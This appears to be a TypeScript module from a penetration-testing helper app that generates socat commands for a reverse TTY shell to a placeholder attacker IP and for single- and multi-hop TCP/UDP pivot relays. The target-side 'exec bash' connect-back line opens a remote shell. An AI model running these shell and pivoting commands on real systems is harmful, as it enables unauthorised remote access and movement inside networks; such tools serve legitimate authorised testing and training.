import { SocatPivot } from "@/app/hooks/useSocatPivot";
import { CommandStep } from "@/app/types/tool";

export type SocatCommandSection = {
  title: string;
  steps: CommandStep[];
};

/**
 * Resolves socat commands into an ordered array of sections.
 *
 * — TTY shell:        2 sections (Attacker listener | Target connect-back) — side-by-side
 * — UDP forward:      2 sections (Relay Host | Attacker access)            — side-by-side
 * — TCP single-hop:   2 sections (Relay Host | Attacker access)            — side-by-side
 * — TCP multi-hop:    N+1 sections ordered by setup sequence (innermost relay first)
 *                     → displayed as stacked sections with dividers
 *
 * Steps are numbered globally across all sections.
 */
export function resolveSocatCommands(pivot: SocatPivot): SocatCommandSection[] {
  let step = 1;

  /* ─── TTY Shell ─── */
  if (pivot.mode === "tty-shell") {
    const attackerIP = pivot.attackerIP?.trim() ? pivot.attackerIP : "<ATTACKER_IP>";
    return [
      {
        title: "Attacker",
        steps: [
          {
            step: step++,
            command: `socat file:\`tty\`,raw,echo=0 TCP-LISTEN:${pivot.ttyListenPort}`,
          },
        ],
      },
      {
        title: "Target",
        steps: [
          {
            step: step++,
            command: `socat exec:'bash -li',pty,stderr,sane TCP:${attackerIP}:${pivot.ttyListenPort}`,
          },
        ],
      },
    ];
  }

  /* ─── UDP Forward (single hop only) ─── */
  if (pivot.mode === "udp-forward") {
    const hop = pivot.hops[0];
    const relayIP = hop.relayIP?.trim() ? hop.relayIP : "<RELAY_IP>";
    const targetIP = hop.targetIP?.trim() ? hop.targetIP : "<TARGET_IP>";
    return [
      {
        title: "Relay Host",
        steps: [
          {
            step: step++,
            command: `socat UDP-LISTEN:${hop.listenPort},fork UDP:${targetIP}:${hop.targetPort} &`,
          },
        ],
      },
      {
        title: "Attacker",
        steps: [
          {
            step: step++,
            command: `# Access: send UDP to ${relayIP}:${hop.listenPort}`,
          },
          {
            step: step++,
            command: `# Example DNS query: dig @${relayIP} <hostname>`,
          },
        ],
      },
    ];
  }

  /* ─── TCP Forward (single or multi-hop) ─── */
  const hops = pivot.hops;
  const sections: SocatCommandSection[] = [];

  /*
   * Setup order: innermost relay first (last array index), working outward.
   * This ensures the relay that has nothing to forward to (the final target)
   * is running before the outer relays try to connect through it.
   */
  for (let i = hops.length - 1; i >= 0; i--) {
    const hop = hops[i];
    const isLastHop = i === hops.length - 1;
    const relayIP = hop.relayIP?.trim() ? hop.relayIP : "<RELAY_IP>";

    // What this relay forwards incoming connections to:
    const forwardHost = isLastHop
      ? (hop.targetIP?.trim() ? hop.targetIP : "<TARGET_IP>")
      : (hops[i + 1].relayIP?.trim() ? hops[i + 1].relayIP : "<NEXT_RELAY_IP>");
    const forwardPort = isLastHop
      ? hop.targetPort
      : hops[i + 1].listenPort;

    const sectionTitle =
      hops.length === 1
        ? "Relay Host"
        : i === hops.length - 1
          ? `Relay ${i + 1} (set up first)`
          : `Relay ${i + 1}`;

    sections.push({
      title: sectionTitle,
      steps: [
        {
          step: step++,
          command: `socat TCP-LISTEN:${hop.listenPort},fork TCP:${forwardHost}:${forwardPort} &`,
        },
        // Remind the operator where to run this command
        ...(hops.length > 1
          ? [{ step: step++, command: `# Run on: ${relayIP}` }]
          : []),
      ],
    });
  }

  // Attacker access
  const firstHop = hops[0];
  const firstRelayIP = firstHop.relayIP?.trim() ? firstHop.relayIP : "<RELAY_IP>";
  sections.push({
    title: "Attacker",
    steps: [
      {
        step: step++,
        command: `# Connect to ${firstRelayIP}:${firstHop.listenPort} — traffic reaches the final target`,
      },
      {
        step: step++,
        command: `# Example (HTTP): curl http://${firstRelayIP}:${firstHop.listenPort}`,
      },
    ],
  });

  return sections;
}

